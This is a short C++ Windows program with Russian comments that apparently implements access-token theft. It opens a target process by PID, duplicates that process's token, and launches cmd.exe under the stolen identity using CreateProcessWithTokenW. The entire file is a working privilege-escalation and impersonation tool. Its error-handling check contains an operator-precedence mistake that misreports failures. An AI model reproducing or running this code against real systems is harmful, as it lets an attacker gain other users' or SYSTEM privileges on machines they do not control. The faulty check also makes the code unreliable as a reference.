#include <iostream>
#include <Windows.h>

int main(int argc, char *argv[]){
  int iProcessPid;
  std::cout << "Input target process PID: ";
  std::cin >> iProcessPid;
  //получение хэндла целевого процесса
  HANDLE hProcessHandle = OpenProcess(PROCESS_QUERY_INFORMATION,0,iProcessPid);
  if (hProcessHandle == NULL) {
    std::cout << "[-] Unable to access target process, error: " << GetLastError() << "\n";
    return 1;
  }
  else{
    std::cout << "[+] Got process handle\n";
  }
  //полечение хэндл на токен
  HANDLE hTokenHandle;
  if (!OpenProcessToken(hProcessHandle,TOKEN_READ | TOKEN_DUPLICATE, &hTokenHandle)){
    std::cout << "[-] Unable to access target process token, error: " << GetLastError() << "\n";
    return 1;
  }
  else{
    std::cout << "[+] Got process token\n";
  }
  //клонирование токена и получение хэндла на клон
  HANDLE hClonedTokenHandle;
  if (!DuplicateTokenEx(hTokenHandle,TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_ADJUST_DEFAULT | TOKEN_ADJUST_SESSIONID ,NULL,SecurityDelegation,TokenPrimary,&hClonedTokenHandle)){
    std::cout << "[-] Unable to duplicate access token, error: " << GetLastError() << "\n";
    return 1;
  }
  else{
    std::cout << "[+] Token cloned\n";
  }
  //инициализация необходимых структур
  wchar_t cmd[] = L"cmd.exe";
  PROCESS_INFORMATION piNewProcess = PROCESS_INFORMATION();
  STARTUPINFOW NpStartupInfo = STARTUPINFOW();
  NpStartupInfo.lpDesktop = NULL;
  //создание нового процесса с украденным токеном
  if (!CreateProcessWithTokenW(hClonedTokenHandle, LOGON_WITH_PROFILE,NULL,cmd,0,NULL,NULL,&NpStartupInfo,&piNewProcess)){
    if (!GetLastError() == 1314){
      std::cout << "[-] Unable to run new process, error: " << GetLastError() << "\n";
      return 1;
    }
    else{
      std::cout << "[?] Current user doesn't have SeImpersonatePrivilege";
    }
  }
  else{
    std::cout << "[+] Process created\n";
  }
}